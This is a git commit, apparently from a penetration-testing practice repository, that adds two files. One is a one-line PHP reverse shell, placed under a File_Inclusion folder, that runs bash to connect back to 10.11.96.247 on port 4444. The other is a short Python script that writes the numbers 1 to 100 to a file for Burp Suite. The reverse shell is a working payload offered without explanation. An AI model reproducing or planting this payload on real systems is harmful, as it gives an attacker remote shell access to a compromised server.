f72e38cd9543d8b904208c9f5a6da52b8a83fd1e
Coach Beard Jr. <65058877+vijay2249@users.noreply.github.com>
2024-11-09 23:05:04 +0530

    Add files via upload

---
+++ File_Inclusion/reverseShell.php
@@ -0,0 +1,1 @@
+<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.11.96.247/4444 0>&1'"); ?>
---
+++ burpsuite/num.py
@@ -0,0 +1,5 @@
+with open("num.txt", "w") as f:
+    for i in range(1, 101):
+        f.write(str(i))
+        f.write("\n")
+
